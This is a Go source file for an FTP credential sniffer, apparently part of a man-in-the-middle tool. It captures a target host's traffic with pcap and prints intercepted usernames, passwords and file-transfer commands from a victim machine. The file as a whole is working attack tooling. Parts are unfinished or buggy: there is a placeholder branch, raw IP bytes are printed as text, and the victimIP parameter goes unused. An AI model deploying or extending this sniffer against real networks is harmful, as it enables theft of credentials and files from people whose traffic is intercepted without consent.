package sniffer

import (
	"time"
	"fmt"
	"log"
	"strings"
	"errors"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
    "github.com/google/gopacket/pcap"
	"os"
)

var (	
	snaplen int32 = 1024
	promisc bool  = false
	timeout time.Duration = pcap.BlockForever

	/* prettify */
	red   = "\033[31m"
	cyan  = "\033[36m"
	green = "\033[32m"
	fn    = "\033[0m"
)

/* 
 ** Loops through array of available interfaces on host,
 ** then chooses first one that is not loopback (lo0)
 */

func selectInterface() (pcap.Interface, error) {
	ifaces, err := pcap.FindAllDevs()
	if err != nil {
		return pcap.Interface{}, err
	}
	for _, iface := range ifaces {
		if iface.Name != "lo0" && iface.Name != "lo" {
			return iface, nil
		}
	}
	return pcap.Interface{}, errors.New("could not find valid network interface")
}

/*
 ** Filters TCP/FTP packets from rest of network,
 ** then prints only packets with Cred./File transfer FTP instructions
 */

func parseCaughtPacket(packet gopacket.Packet) {
	linkLayer := packet.LinkLayer()
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	tcpLayer := packet.Layer(layers.LayerTypeTCP)
	
	if linkLayer == nil || ipLayer == nil || tcpLayer == nil {
		fmt.Println("[ NULL ] Caught malformed packet")
		return
	}
	
	ip, _ := ipLayer.(*layers.IPv4)
	tcp, _ := tcpLayer.(*layers.TCP)
	appLayer := packet.ApplicationLayer()

	if appLayer != nil && (tcp.SrcPort == 21 || tcp.DstPort == 21) && 
		linkLayer.LinkFlow().Src().String() == os.Args[2] {
		payload := strings.Split(string(appLayer.Payload()), " ")
		
		fmt.Printf("[DEBUG] %s\n", string(ip.SrcIP))
		if string(ip.SrcIP) == os.Args[5] {
			/* Server --> client traffic */
			fmt.Printf("[PLACEHOLDER] caught server traffic")
		} else {
			/* Client --> server traffic */
			switch payload[0] {
			case "USER":
				fmt.Print(red,"[CRED]",fn," Caught credentials: username ",payload[1])
			case "PASS":
				fmt.Print(red,"[CRED]",fn," Caught credentials: password ",payload[1])
			case "RETR":
				fmt.Print(green,"[FILE TRANSFER]",fn," Client <--- Server: ",payload[1])
			case "STOR":
				fmt.Print(green,"[FILE TRANSFER]",fn," Client ---> Server: ",payload[1])
			default:
				fmt.Print(cyan,"[",payload[0],"]",fn)
				if len(payload) > 1 {
					fmt.Printf(" payload: %s\n", strings.Join(payload[1:], " "))
				}
			}
		}
	}
}

/*
 ** Tunnel packets to initial destination,
 ** not to provoke an unintended DoS on client
 */

func Sniffer(victimIP string) {
	filter := "not ipv6 and tcp and host " + os.Args[3]
	iface, err := selectInterface()
	
	if err != nil {
		log.Fatal(err)
	}
	dev := iface.Name
	handle, err := pcap.OpenLive(dev, snaplen, promisc, timeout)
	
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
	}
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	
	fmt.Printf("📡 [ MONITORING NETWORK FOR IP %s ] 📡\n", os.Args[3])
	for packet := range packetSource.Packets() {
		parseCaughtPacket(packet)
	}
}
